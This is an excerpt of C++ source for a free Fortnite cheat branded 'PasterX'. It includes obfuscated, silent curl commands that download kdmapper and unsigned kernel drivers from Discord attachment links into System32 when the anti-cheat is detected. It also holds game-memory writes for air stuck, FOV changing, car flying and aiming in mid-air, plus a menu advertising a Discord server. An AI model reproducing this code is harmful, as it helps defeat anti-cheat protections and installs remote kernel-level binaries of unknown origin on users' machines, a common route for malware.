...
int main(int argc, const char* argv[])
{
	...
	if (process_find(_xor_("FortniteClient-Win64-Shipping_EAC.exe"))) {
		system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1046909180574965891/1053323540612530278/kdmapper.exe --output C:\\Windows\\System32\\kdmapper.exe >nul 2>&1").c_str());
		system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1046909180574965891/1053323616978227280/RafilIOUDUD_1.sys --output C:\\Windows\\System32\\RafilIOUDUD_1.sys >nul 2>&1").c_str());
	...
	if (process_find(_xor_("FortniteClient-Win64-Shipping_BE.exe"))) {
		system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1046909180574965891/1053323540612530278/kdmapper.exe --output C:\\Windows\\System32\\kdmapper.exe >nul 2>&1").c_str());
		system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1046909180574965891/1053323617242451978/Battle_Eye_UD_1_1.sys --output C:\\Windows\\System32\\Battle_Eye_UD_1_1.sys >nul 2>&1").c_str());
		system(_xor_("cd C:\\Windows\\System32\\").c_str());
		system(_xor_("cls").c_str());
	...
	Beep(300, 1000);
	if (process_find(_xor_("FortniteClient-Win64-Shipping_EAC.exe"))) {
		std::cout << "[PasterX] " << "Loaded With Easy Anti Cheat!\n\n";
	}
	if (process_find(_xor_("FortniteClient-Win64-Shipping_BE.exe"))) {
		std::cout << "[PasterX] " << "Loaded With Battle Eye!\n\n";
	}

	printf("[PasterX] Fortnites Id Base Is: %p", (void*)base_address);
	...
	for (int i = 0; i < VisDist; i++)
	{
	   ...
	   // if (read<float>(CurrentActor + OFFSETS::Revivefromdbnotime) != 10) continue;
		...
		if (AimWhileJumping) { //Allows you to ADS when You are in the Air
			...
			write<bool>(LocalPawn + 0x4B35, false); //bADSWhileNotOnGround
		}
		if (FOVChanger)
		{
			uintptr_t PlayerCameraManager = read<uintptr_t>(PlayerController + 0x338); //Player
			write<float>(PlayerCameraManager + 0x284 + 0x4, FOVChangerValue);
		}

		if (AirStuck) {  //Freezes You in the Air
			if (GetAsyncKeyState(VK_MENU), Controller::IsPressingLeftTrigger()) { //Alt Keybind
				write<float>(LocalPawn + 0x98, 0); //CustomTimeDilation
			}
			else {
				write<float>(LocalPawn + 0x98, 1); //CustomTimeDilation
			}
		}
		...
		//{
			...
			//if (LocalVehicle)
			//{
			//	write<float>(LocalVehicle + 0xc6c, 3);
			//	write<float>(LocalVehicle + 0x8e0, 3 + 2);
			//	write<float>(LocalVehicle + 0x8e4, 3);
			//	write<float>(LocalVehicle + 0x770, 3);
			//}
		//}
		...
		*/
		...
		if (carFly)
		{
			if (LocalPawn)
			{
				...
				if (GetAsyncKeyState(VK_SPACE))write<char>(VEHICLE_STATS + 0x6AA, 1);//AFortAthenaVehicle    bUseGravity : 1        0x67a    char
			}
		}
...
void render() {
	...
	if (ShowMenu)
	{
		...
		ImGui::Text("PasterX Free | Discord.gg/Pasterx");
		ImGui::Separator();
